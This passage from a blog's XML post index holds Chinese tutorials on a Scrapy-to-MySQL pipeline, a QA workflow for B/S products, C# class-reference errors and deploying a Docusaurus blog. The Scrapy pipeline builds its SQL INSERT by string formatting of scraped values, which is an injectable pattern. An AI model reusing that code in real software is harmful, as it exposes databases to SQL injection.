  )<br>    # 创建游标<br>    self.cursor &#x3D; self.conn.cursor()</li></ul></li><li><p>写入数据库</p></li><li><p>{}是占位符，后面是item中取出来的数据，学过asp.net的小伙伴会发现，它这个赋值取值的方法有点像Cookie和ViewData等等。写好sql语句就调用游标的增删改方法</p><ul><li>def process_item(self, item, spider):<br>    sql = ‘insert into goods(title,price,imgurl) values(“{}”,”{}”,”{}”)’.format(item[‘title’], item[‘price’], item[‘imgurl’])<br>    # 执行sql语句<br>    self.cursor.execute(sql)<br>    # 提交事务<br>    self.conn.commit()<br>    return item<br><br>def __del__(self):<br>    # 关闭游标<br>    self.cursor.close()<br>    # 关闭连接<br>    self.conn.close()</li></ul></li><li><p>运行，终端输入。</p><ul><li>scrapy crawl 我们的name属性值（爬虫文件中定义了，不知道的看上面）</li></ul></li></ul><hr><h1 id="结语："><a href="#结语：" class="headerlink" title="结语："></a>结语：</h1><p>鄙人才疏学浅，还请多多指教。</p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码 </tag>
            
            <tag> 方法 </tag>
            
            <tag> 文件 </tag>
            
            <tag> 目录 </tag>
            
            <tag> 对象 </tag>
            
            <tag> 标签 </tag>
            
            <tag> 整数 </tag>
            
            <tag> 素材 </tag>
            
            <tag> import </tag>
            
            <tag> scrapy </tag>
            
            <tag> item </tag>
            
            <tag> settings </tag>
            
            <tag> self </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BS架构通用质量保障工作流程</title>
      <link href="/posts/b1a6e353d3b0/"/>
      <url>/posts/b1a6e353d3b0/</url>
      
        <content type="html"><![CDATA[<p>质量保障是做好产品十分重要的一步，但是为了快速起项目形成业务，很多项目在设计之初全由前后端开发人员自测，稳定上线后才补上质量保障侧的内容。本文旨在梳理一套BS架构产品的通用质量保障模型。</p><h1 id="产品设计与技术评审阶段"><a href="#产品设计与技术评审阶段" class="headerlink" title="产品设计与技术评审阶段"></a>产品设计与技术评审阶段</h1><p>在设计阶段，QA应当在各评审会1小时前开始阅读并评论方案，以此提高会议效率并尽可能发现其中问题。</p><h2 id="产品定义文档（PRD）评审-x2F-用户体验设计（UED）评审"><a href="#产品定义文档（PRD）评审-x2F-用户体验设计（UED）评审" class="headerlink" title="产品定义文档（PRD）评审&#x2F;用户体验设计（UED）评审"></a>产品定义文档（PRD）评审&#x2F;用户体验设计（UED）评审</h2><p>在此阶段，开发（RD）与测试（QA）人员应当替PRD&#x2F;UED捉虫，寻找PRD&#x2F;UED当中的缺漏和未定义行为。在开发之前就尽量完善PRD到RD、QA没有疑问。举个例子：</p><p>需求名为“为搜索框增加搜索历史记录与搜索建议”，PRD中没有显式说明该需求的“记录的历史记录”是点击搜索按钮、按下回车哪一种方式触发；也没有说明搜索历史记录记录的是用户所有搜索行为还是仅记录用户点击搜索建议后产生的搜索行为。这样RD可能会理解&#x2F;曲解PRD，只记录点击搜索建议以后的搜索关键词。显然从用户视角这样的产品很奇怪，但是从RD视角来看“反正PRD这里没定义，怎么好做怎么来呗”。这样的厚度哦就是功能做出来PM发现和自己想的不一样，用户用起来不爽。如果在需求评审阶段就能解释清楚需求定义不明确的内容，这种问题就能大大减少。</p><p>一些常见的思考发散方向为：</p><table><thead><tr><th>方向名</th><th>发散举例</th><th>意义</th></tr></thead><tbody><tr><td>权限控制</td><td>这个需求不需要做权限控制吗</td><td>防止需要控制的功能PM忘记做权限控制，或新功能需要收缩权限但是忘了或者没注意</td></tr><tr><td>数据</td><td>这个需求埋点设计成这样是不是不合适</td><td>埋点放在哪里、怎么触发才能达成PM的需求，收集到他们需要的数据需要一定的前端常识，而PM不一定有相关技术积累</td></tr><tr><td>交互逻辑</td><td>当用户没有某某权限时，这个按钮是否需要置灰</td><td>有些小需求没有UED直接参与，一些展示逻辑PM想的可能不会很全，需要问清楚</td></tr><tr><td>边缘案例</td><td>当子节点数量太多，这个页面下半截会全部被子节点遮挡，要不要加个max-height</td><td>同上</td></tr><tr><td>设计过于复杂&#x2F;简单</td><td>这个功能可以通过和某某现存功能集成的方式实现，不单独开一个页面是否可行？（反之亦然）否则实现成本会太高&#x2F;维护成本会太高</td><td>PM可能不会考虑技术上可以通过耦合&#x2F;解耦合降低系统维护和开发&#x2F;测试成本</td></tr></tbody></table><p>值得注意的是，除非需求太离谱，**不要轻易质疑PM这个需求有什么意义**。我们研发人员如果没有去和用户做调研，不知道客户在想什么就去拍脑袋抢PM的工作只会让PM觉得你很烦。</p><h2 id="技术评审"><a href="#技术评审" class="headerlink" title="技术评审"></a>技术评审</h2><p>一般而言PM不具备很强的技术背景，技术评审中PM会难以捕捉RD设计的方案中可能与PRD不同的地方；因此QA作为技术人员，应仔细评估技术方案能否覆盖整个需求。有研发相关知识的QA更应当就自己理解的技术难点向RD提问来提前暴露排期、技术设计中的漏洞。一些常见的思考方式有：</p><table><thead><tr><th>方向名</th><th>发散举例</th><th>意义</th></tr></thead><tbody><tr><td>性能</td><td>接口这样设计有可能性能不足？这样改接口对性能有多少影响</td><td>性能应当是后端考虑的重要问题，但是如果他们没有考虑，QA要替PM问道</td></tr><tr><td>数据安全</td><td>这些东西放在local storage是否合理，会不会导致泄露或权限控制失败？</td><td>防止RD实现的时候只考虑实现难易程度，不考虑安全性</td></tr><tr><td>实现建议</td><td>最近在推行自动化，请在代码中添加ID等识别符方便QA定位元素</td><td>给前端元素加id、给后端代码加探针都是对前后端没有直接意义但是对整个产品质量保障有重大意义的事情。</td></tr><tr><td>边缘案例</td><td>当子节点数量太多，这个页面下半截会全部被子节点遮挡，要不要加个max-height</td><td>同产品方案评审</td></tr></tbody></table><h2 id="测试用例评审"><a href="#测试用例评审" class="headerlink" title="测试用例评审"></a>测试用例评审</h2><p>测试用例评审的最重要目的是告知RD哪些测试用例需要在交付QA前自行测试完成——这些测试用例被称为“自测用例”；其次，测试用例评审中团队内其他角色可以站在他们的视角上为QA提供更多思路完善测试用例。自测用例的作用是为研发交付测试的产品设置准入门槛，防止研发写了一堆bug以后自己也没试过就直接丢给QA，消耗QA过多人力做重复而无用的工作。自测用例应当覆盖该功能的所有核心要素和最直接影响用户体验的界面组件。但是，自测用例不应该超出PRD显式定义的范畴，覆盖过大面积的自测用例会让RD心力憔悴，也会降低RD充分自测的意愿。</p><h1 id="研发阶段"><a href="#研发阶段" class="headerlink" title="研发阶段"></a>研发阶段</h1><p>研发阶段QA参与相对较少，主要由RD遵守预先设置的质量保障规范来保障前期质量。当然这不意味着在需求开发的时候QA没事情做。QA一般可以在此时完成已上线产品功能的自动化覆盖、巡检和其他未完成的质量管理流程建设。</p><h2 id="代码规范"><a href="#代码规范" class="headerlink" title="代码规范"></a>代码规范</h2><p>严格遵守PEP； 使用TypeScript替代JS；使用ESLint并致力于消除绝大多数error&#x2F;warning；正确命名变量并在弱类型语言&#x2F;动态类型语言中主动使用类型定义等代码编写策略都可以减少意外的问题。一般而言公司会有编写代码的标准流程，团队应在自身实际情况的基础上修改、优化规范并努力执行。</p><h2 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h2><p>单元测试是<strong>测试单个函数</strong>逻辑是否正确必不可少的部分，单元测试一般由RD团队编写，并尽可能覆盖功能的每个函数。做单元测试时，所有数据全部使用假数据（Mock），所有用例跑在本地，着眼于单个函数内部逻辑而非多个组件之间的联系。</p><p>单元测试一般应占到开发实践20%以上.</p><h2 id="集成测试"><a href="#集成测试" class="headerlink" title="集成测试"></a>集成测试</h2><p>在交付QA前，RD应当根据自测用例列表将集成好的前后端试用、测试一遍。这一过程可以手动进行，也可以通过运行已有的自动化测试用例作回归，只对增量手动测试。</p><p>集成测试的自动化可以考虑QA与RD共建，RD做最低限度的、仅包含自测用例的集成测试；其余边缘、发散用例由QA自动化。</p><h2 id="代码审查"><a href="#代码审查" class="headerlink" title="代码审查"></a>代码审查</h2><p>代码审查不仅要做，还应该好好做。交叉代码审核有利于找出低级编码错误、统一代码风格、严格落实编码规范。这一过程主要在RD内部进行。</p><h1 id="测试阶段"><a href="#测试阶段" class="headerlink" title="测试阶段"></a>测试阶段</h1><p>测试阶段QA应按照基本的工作规范完成端到端手工、自动化测试。根据测试情况对项目做质量评估，决定是否能交付PM验收或是否拒绝RD提测。</p><p>拒绝RD提测一般由于过多测试用例失败或核心流程没走通就提测。</p><h1 id="上线流程管控"><a href="#上线流程管控" class="headerlink" title="上线流程管控"></a>上线流程管控</h1><p>代码在本地跑的通不代表代码上线能跑，QA验收了也不代表真的发现了所有的bug。因此，上线流程管控是必不可少的。在上线流程中，QA和项目组长可以通过一些自动化或流程管理手段减少或消除上线风险。</p><h2 id="CICD"><a href="#CICD" class="headerlink" title="CICD"></a>CICD</h2><p>现代软件开发流程为了减轻编译上线中的重复劳动一般都会配备基本的持续集成开发流水线，在流水线中，我们可以通过添加自动化测试和手动确认卡点来进行各类上线前的检查。</p><p>可能你会问，我们之前做了很多手工和自动化测试了，有必要在临上线还要做卡点检查呢？答案是有必要——一个迭代不会只做一个需求，而测试阶段每个需求是独立测试的。在上线过程中涉及到代码合并、配置文件增删，很有可能出现牵一发而动全身的问题。在这个阶段，我们可以通过下面的节点来增强稳定性</p><ol><li>自动化回归测试节点<br>在这个节点，我们通过运行已有的API自动化、UI自动化、Diff测试、压力测试脚本检查本次上新的功能有没有影响已上线逻辑、有没有导致线上性能劣化。</li><li>小流量&#x2F;灰度测试<br>当自动化测试没有发现问题，对于多机房&#x2F;多集群服务，我们可以先在一个机房的一台机器或部分机器部署服务并在前端实际体验一下新旧业务的核心流程是否出现问题。人在流程中永远是最后兜底的角色。</li></ol><h1 id="线上质量管控"><a href="#线上质量管控" class="headerlink" title="线上质量管控"></a>线上质量管控</h1><p>线上质量管控指的是QA和RD针对已在线上的服务设计的服务稳定性监控。除了对本产品的逻辑进行监控，这种监控还有助于发现由于依赖服务未告知即变更带来的线上问题。</p><h2 id="巡检"><a href="#巡检" class="headerlink" title="巡检"></a>巡检</h2><p>API自动化、UI自动化、Diff测试都可以设置定时巡检。定时巡检的目的就是帮助及时发现依赖服务、基础服务变动导致的自身业务崩溃，避免在大量用户反馈无法使用服务以后才后知后觉，产生巨大影响。巡检的建设中，API自动化和API Diff测试应当为首要建设目标——它们建设简单，收益巨大，也可以作为QA了解本产品所有接口的最好切入点。</p><p>相比侵入性较小的API自动化，性能测试一般只在用户量较低的时段、在部分机房周知各个依赖方的情况下进行。这样操作是为了避免对上下游产生不必要的压力，也为了防止压测时用户量居于高位，影响用户的体验。</p><p>UI自动化有其自身特点——UI改动一般较为细致，也较为没有结构无法预测改动，因而建设优先级相对较低。</p><h2 id="稳定性监控"><a href="#稳定性监控" class="headerlink" title="稳定性监控"></a>稳定性监控</h2><p>稳定性监控可以通过关注时段内日志聚类（接口调用成功率、服务报错数）、资源监控（服务器资源占用情况）等服务数据波动情况来尽早发现可能存在的问题。常用的指标有：<br>链路完成速度同比、常见错误数量波动、服务调用数跌零&#x2F;过低&#x2F;过高、业务数据（如走某个业务分支的请求数占总请求数比例）跌零&#x2F;过低&#x2F;过高、QPS跌零&#x2F;过低&#x2F;过高等</p><h1 id="质量保障标准"><a href="#质量保障标准" class="headerlink" title="质量保障标准"></a>质量保障标准</h1><p>QA的另一个关键工作时制定质量保障标准。服务不可能永远不出错，出错后的应对措施必须再出错前就决定好，才不会在出错后无所适从。QA需要建设的质量保障标准一般有测试用例标准、提测准入标准、bug修复流程与时效要求、线上事故定级标准与复盘流程等</p><h2 id="测试用例标准"><a href="#测试用例标准" class="headerlink" title="测试用例标准"></a>测试用例标准</h2><p>指的是QA编写测试用例的方式方法和基本结构、不同优先级的用例划分的标准。</p><h2 id="提测准入标准"><a href="#提测准入标准" class="headerlink" title="提测准入标准"></a>提测准入标准</h2><p>指的是达到何种标准，RD可以交付产品到QA进行测试。一般而言要求100%自测用例通过方可提交测试。</p><h2 id="bug修复流程与时效要求"><a href="#bug修复流程与时效要求" class="headerlink" title="bug修复流程与时效要求"></a>bug修复流程与时效要求</h2><p>指的是不同优先级的bug要求的平均响应时长、平均问题定位时长、平均修复时长及无法及时完成时的升级流程。</p><h2 id="线上事故定级标准与复盘流程"><a href="#线上事故定级标准与复盘流程" class="headerlink" title="线上事故定级标准与复盘流程"></a>线上事故定级标准与复盘流程</h2><p><strong>事故定级标准</strong>指的是线上事故的定义方式、发生线上事故时的定级定损标准与事故响应流程、时效要求。</p><p><strong>事故复盘流程</strong>指的是线上事故<strong>解决后</strong>如何进行事故根因追查、工作流程优化（以避免同类事故重复发生）</p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务 </tag>
            
            <tag> 架构 </tag>
            
            <tag> 服务器 </tag>
            
            <tag> 函数 </tag>
            
            <tag> 机器 </tag>
            
            <tag> 方法 </tag>
            
            <tag> 文件 </tag>
            
            <tag> 测试 </tag>
            
            <tag> 客户 </tag>
            
            <tag> 搜索 </tag>
            
            <tag> 自动化 </tag>
            
            <tag> prd </tag>
            
            <tag> 流程 </tag>
            
            <tag> 自测用例 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的类为什么使用不了了？</title>
      <link href="/posts/227c3c99fa99/"/>
      <url>/posts/227c3c99fa99/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在调用类时，如果出现错误信息 “ 当前上下文中不存在名称*** ”，这时候该如何处理，我们来一起总结一下。</p><h2 id="错误情况1"><a href="#错误情况1" class="headerlink" title="错误情况1"></a>错误情况1</h2><p>在同一项目中使用“TestClass2”这个类时出现错误。</p><p><img src="https://static.luozhinet.com/73/534f9960d10941466bcb49e300191e"></p><p> <img src="https://static.luozhinet.com/f3/311d79a575a60d9ed5e9aeb81903ea"></p><p> <img src="https://static.luozhinet.com/31/4413f60c509a89f82a2a3cc1f02393"></p><p> 【分析】：这个错误比较明显，图中将“TestClass2”写在了 “TestClass1”中，类在使用中是不允许出现嵌套的，否则就是我们常说的“类中类”，必须杜绝这样的编程失误。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p><img src="https://static.luozhinet.com/34/4ac27e4f9b67302c7f71a39380e146"></p><p>只要将“TestClass2” 从“TestClass1” 中移出来即可。</p><h2 id="错误情况2"><a href="#错误情况2" class="headerlink" title="错误情况2"></a>错误情况2</h2><p>在同一项目中使用“TestClass2”这个类时出现错误。</p><p><img src="https://static.luozhinet.com/55/ed1ec3bab62eeedc39b366b157c041"></p><p> <img src="https://static.luozhinet.com/ad/f86c7f7208d19930770137286540c6"></p><p> <img src="https://static.luozhinet.com/c4/1eee6201587190a2c458902f5530ae"></p><p>【分析】：“TestClass1”中只有一个方法，没有其他类，所以不存在“类中类”的情况。仔细观察，发现Program 的命名空间为 “thinger.com” ,而“TestClass1”的命名空间为 “thinger.com.cn”，两者的命名空间不一致。</p><h2 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h2><p>将命名空间改为一致即可。</p><h2 id="错误情况3"><a href="#错误情况3" class="headerlink" title="错误情况3"></a>错误情况3</h2><p>在同一项目中使用“TestClass1”这个类时出现错误。</p><p><img src="https://static.luozhinet.com/98/e2a69d4f24e1e503e496ad98fdf39e"></p><p> <img src="https://static.luozhinet.com/c4/ae44a5c202ab916e44c10cbbf4f707"></p><p> <img src="https://static.luozhinet.com/61/cd6031d7fe6be64e6fdd08ccf10935"></p><p>【分析】：类名称为 “TestClass1”，而使用时却将类名称写成了“TestClass11”。</p><h2 id="解决方案-2"><a href="#解决方案-2" class="headerlink" title="解决方案"></a>解决方案</h2><p>将类名改为 “TestClass1”即可。</p><h2 id="错误情况4"><a href="#错误情况4" class="headerlink" title="错误情况4"></a>错误情况4</h2><p>在调用类库中的“TestClass”这个类时出现错误。</p><p><img src="https://static.luozhinet.com/f9/5e7d61a5fff59487c0f2b4aa81c5ef"></p><p> <img src="https://static.luozhinet.com/e8/6129234c174892f04c00711dae4c74"></p><p>【分析】：无法调用类库中的类时，可能是由于没有在项目中将类库引用进来。</p><h2 id="解决方案-3"><a href="#解决方案-3" class="headerlink" title="解决方案"></a>解决方案</h2><p><img src="https://static.luozhinet.com/1f/38088e460c7e8ac45406197e630875"></p><p>首先右击引用，点击添加引用。</p><p><img src="https://static.luozhinet.com/62/6ba735797ac4067c954d3f4ba57645"></p><p>在解决方案下找到要添加引用的类库，点击确定，将类库引用进来。</p><p><img src="https://static.luozhinet.com/a2/5960e13a0784bf2cda6ead122e5ec4"></p><p> 最后在代码中引用类库，问题解决。</p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 方法 </tag>
            
            <tag> 错误 </tag>
            
            <tag> testclass1 </tag>
            
            <tag> 类库 </tag>
            
            <tag> testclass2 </tag>
            
            <tag> 引用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docusaurus 一键快速部署个人博客</title>
      <link href="/posts/013f46e607cb/"/>
      <url>/posts/013f46e607cb/</url>
      
        <content type="html"><![CDATA[<h2 id="一-、通过云开发平台快速创建初始化应用"><a href="#一-、通过云开发平台快速创建初始化应用" class="headerlink" title="一 、通过云开发平台快速创建初始化应用"></a>一 、通过云开发平台快速创建初始化应用</h2><h3 id="1-创建相关应用模版请参考链接：5分钟站点生成神器——Docusaurus"><a href="#1-创建相关应用模版请参考链接：5分钟站点生成神器——Docusaurus" class="headerlink" title="1.创建相关应用模版请参考链接：5分钟站点生成神器——Docusaurus"></a>1.创建相关应用模版请参考链接：<a href="https://developer.aliyun.com/article/915461">5分钟站点生成神器——Docusaurus</a></h3><h3 id="2-完成创建后就可以在github中查看到新增的Docusaurus仓库"><a href="#2-完成创建后就可以在github中查看到新增的Docusaurus仓库" class="headerlink" title="2.完成创建后就可以在github中查看到新增的Docusaurus仓库"></a>2.完成创建后就可以在github中查看到新增的Docusaurus仓库</h3><p><img src="https://static.luozhinet.com/03/149f22918b4e379c456897f9c51432" alt="截屏2022-04-22 下午3.36.35.png"></p><h2 id="二-、-本地编写个人博客"><a href="#二-、-本地编写个人博客" class="headerlink" title="二 、 本地编写个人博客"></a>二 、 本地编写个人博客</h2><h3 id="1-将应用模版克隆到本地"><a href="#1-将应用模版克隆到本地" class="headerlink" title="1.将应用模版克隆到本地"></a>1.将应用模版克隆到本地</h3><p>● 首先假定你已经安装了Git、node，没有安装请移步node官网进行安装。克隆项目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone + 项目地址</span><br></pre></td></tr></table></figure><p>● 进入项目文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd Docusaurus</span><br></pre></td></tr></table></figure><p>● 切换到feature&#x2F;1.0.0 分支上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout feature/1.0.0</span><br></pre></td></tr></table></figure><p>● 安装依赖包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure><p>● 启动服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run start</span><br></pre></td></tr></table></figure><p>这里打开浏览器3000端口，并出现默认页面。</p><h3 id="2-项目结构"><a href="#2-项目结构" class="headerlink" title="2.项目结构"></a>2.项目结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">my-website</span><br><span class="line">├── blog</span><br><span class="line">│   ├── 2019-05-28-hola.md</span><br><span class="line">│   ├── 2019-05-29-hello-world.md</span><br><span class="line">│   └── 2020-05-30-welcome.md</span><br><span class="line">├── docs</span><br><span class="line">│   ├── doc1.md</span><br><span class="line">│   ├── doc2.md</span><br><span class="line">│   ├── doc3.md</span><br><span class="line">│   └── mdx.md</span><br><span class="line">├── package.json</span><br><span class="line">├── src</span><br><span class="line">│   ├── css</span><br><span class="line">│   │   └── custom.css</span><br><span class="line">│   └── pages</span><br><span class="line">│       ├── styles.module.css</span><br><span class="line">│       └── index.js</span><br><span class="line">├── static</span><br><span class="line">│   └── img</span><br><span class="line">├── docusaurus.config.js</span><br><span class="line">├── package.json</span><br><span class="line">├── README.md</span><br><span class="line">├── sidebars.js</span><br><span class="line">└── yarn.lock</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>&#x2F;blog&#x2F; - 里面就是写博客文章的，都是 markdown 文件。</li><li>&#x2F;docs&#x2F; - 里面就是写文档的，也都是 markdown 文件。</li><li>&#x2F;src&#x2F; - 源代码文件夹，里面有一个 css 文件夹，然后它里边有个 custom.css 里面是写自定义的 css 代码的。</li><li>&#x2F;src&#x2F;pages - 里边放一些自定义的页面，使用 react 语法来写。</li><li>&#x2F;static&#x2F; - 放静态资源文件，这些文件会出现在最后打包出来的静态网站里面，在它的根目录下边，它下边的 img 文件夹是放静态图片的。</li><li>&#x2F;docusaurus.config.js - 这个是配置这个站点的。</li><li>&#x2F;package.json - node.js 的工程配置文件。</li><li>&#x2F;sidebar.js - 配置文档页面侧边栏，只有文档页面才有，用它来定义文档的目录结构。<br>另外呢，也可以自己创建一个 theme 文件夹，里边可以定义一些组件用来替换默认主题里面的一些组件。</li></ul><h3 id="3-配置为博客模式"><a href="#3-配置为博客模式" class="headerlink" title="3.配置为博客模式"></a>3.配置为博客模式</h3><p>docusaurus 默认是文档风格的主页，要是把它改成一个博客形式的，需要做一点点的配置。打开它的配置文件，docusaurus.config.js 。把 presets 这个配置改成如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">presets: [</span><br><span class="line">  [</span><br><span class="line">    &quot;@docusaurus/preset-classic&quot;,</span><br><span class="line">    &#123;</span><br><span class="line">      // docs: &#123;</span><br><span class="line">      //   sidebarPath: require.resolve(&#x27;./sidebars.js&#x27;),</span><br><span class="line">      //   editUrl:</span><br><span class="line">      //     &#x27;https://github.com/facebook/docusaurus/edit/master/website/&#x27;,</span><br><span class="line">      // &#125;,</span><br><span class="line">      blog: &#123;</span><br><span class="line">        path: &quot;./blog&quot;,</span><br><span class="line">        routeBasePath: &quot;/&quot;</span><br><span class="line">      &#125;</span><br><span class="line">      // 省略其它代码</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>如果不用文档的话，就把 docs 这个删除或者注释了，然后加上 blog ，里边添加：</p><ul><li>path 属性，它的值为”.&#x2F;blog”，也就是指向 blog 的文件夹。</li><li>routeBasePath 属性，这个是访问这个博客的路径，设置成&#x2F;斜杠就是默认网站的首页。<br>然后把 src&#x2F;pages 下边 index.js 的改成别的名字或者是给删除，这样的话他就不会同时匹配这两个文件了。</li></ul><p>顶部导航的 docs 如果要去掉的话，可以找到 navBar 这个配置项，把 links 中的有关 docs 的这段删掉：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; to: &quot;docs/doc1&quot;, label: &quot;Docs&quot;, position: &quot;left&quot; &#125;</span><br></pre></td></tr></table></figure><h3 id="4-发表第一篇博客"><a href="#4-发表第一篇博客" class="headerlink" title="4.发表第一篇博客"></a>4.发表第一篇博客</h3><p>写博客就是在 blog 里边创建一个 markdown 文件。标题开始部分是一个日期格式。Docusaurus 会自动把这个日期解析成咱们这个博客的发表日期，后边跟着这个文件的名字，可以起个有意义的，比如说是博客的标题的英文，例如项目里的 Welcome 博客：</p><p>2019-05-30-welcome.md</p><p>文件，里面第一段就是配置这个博客的一些基本信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">id: welcome</span><br><span class="line">title: Welcome</span><br><span class="line">author: Yangshun Tay</span><br><span class="line">author_title: Front End Engineer @ Facebook</span><br><span class="line">author_url: https://github.com/yangshun</span><br><span class="line">author_image_url: https://avatars0.githubusercontent.com/u/1315101?s=400&amp;v=4</span><br><span class="line">tags: [facebook, hello, docusaurus]</span><br><span class="line">---</span><br></pre></td></tr></table></figure><ul><li>id - 访问这个博客的 URL。</li><li>title - 标题。</li><li>author - 作者。</li><li>author_title - 就是作者简短的自我介绍，职位之类的。</li><li>author_image_url - 头像。</li><li>tags - 博客标签, 是个数组形式。<br>如果文章太长想只展示一部分的话，可以加上：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--truncate--&gt;</span><br></pre></td></tr></table></figure><p>这个注释就可以了，它会把它后边的内容隐藏，然后显示一个阅读更多链接。这样第一个博客就完成了。</p><h2 id="三-、-云端一键部署上线应用"><a href="#三-、-云端一键部署上线应用" class="headerlink" title="三 、 云端一键部署上线应用"></a>三 、 云端一键部署上线应用</h2><h3 id="1-上传代码"><a href="#1-上传代码" class="headerlink" title="1.上传代码"></a>1.上传代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &#x27;添加你的注释&#x27;</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><h3 id="2-在日常环境部署"><a href="#2-在日常环境部署" class="headerlink" title="2.在日常环境部署"></a>2.在日常环境部署</h3><p>一键进行应用部署。在应用详情页面点击日常环境的「部署」按钮进行一键部署，部署状态变成绿色已部署以后可以点击访问部署网站查看效果。<br><img src="https://static.luozhinet.com/62/655ca23690fd242d7dc4514ac781cd" alt="截屏2022-04-22 下午3.59.39.png"></p><h3 id="3-配置自定义域名在线上环境上线"><a href="#3-配置自定义域名在线上环境上线" class="headerlink" title="3.配置自定义域名在线上环境上线"></a>3.配置自定义域名在线上环境上线</h3><p>● 配置线上环境自定义域名。在功能开发验证完成后要在线上环境进行部署，在线上环境的「部署配置」-「自定义域名」中填写自己的域名。例如我们添加一个二级域名 company.workbench.fun 来绑定我们部署的前端应用。然后复制自定义域名下方的API网关地址对添加的二级域名进行CNAME配置。<br><img src="https://static.luozhinet.com/01/99bd80226bb55e60b8610d2a0597ef" alt="undefined"><br>● 配置CNAME地址。复制好 API网关域名地址后，来到你自己的域名管理平台（此示例中的域名管理是阿里云的域名管理控制台，请去自己的域名控制台操作）。添加记录的「记录类型」选择「CNAME」，在「主机记录」中输入你要创建的二级域名，这里我们输入「company」，在「记录值」中粘贴我们之前复制的 API网关域名地址，「TTL」保留默认值或者设置一个你认为合适的值即可。<br><img src="https://static.luozhinet.com/28/bb82a642c99de6e1920af299841b13" alt="undefined"><br>● 在线上环境部署上线。回到云开发平台的应用详情页面，按照部署的操作，点击线上环境的「部署按钮」，部署完成以后就在你自定义的域名进行了上线。CNAME 生效之后，我们输入 company.workbench.fun（示例网址） 可以打开部署的页面。至此，如何部署一个应用到线上环境，如何绑定自己的域名来访问一个线上的应用就完成了，赶紧部署自己的应用到线上环境，用自己的域名玩起来吧 ；）</p><p><img src="https://static.luozhinet.com/4b/0a93551f8c2fe8c26e13396218c9fc" alt="截屏2022-04-22 下午4.06.06.png"></p><p>一键创建Docusaurus应用模版链接 ：<a href="https://workbench.aliyun.com/application/front/create?fromConfig=4&fromRepo=sol_github_4">https://workbench.aliyun.com/application/front/create?fromConfig=4&fromRepo=sol_github_4</a></p><p>参考文献：<a href="https://blog.csdn.net/fengqiuzhihua/article/details/104683781">https://blog.csdn.net/fengqiuzhihua/article/details/104683781</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作 </tag>
            
            <tag> 应用 </tag>
            
            <tag> 文件 </tag>
            
            <tag> run </tag>
            
            <tag> 目录 </tag>
            
            <tag> 域名 </tag>
            
            <tag> auto </tag>
            
            <tag> 部署 </tag>
            
            <tag> docs </tag>
            
            <tag> docusaurus </tag>
            
            <tag> 标签 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>子网掩码、前缀长度、IP地址数的换算</title>
      <link href="/posts/4358b00bc797/"/>
      <url>/posts/4358b00bc797/</url>
      
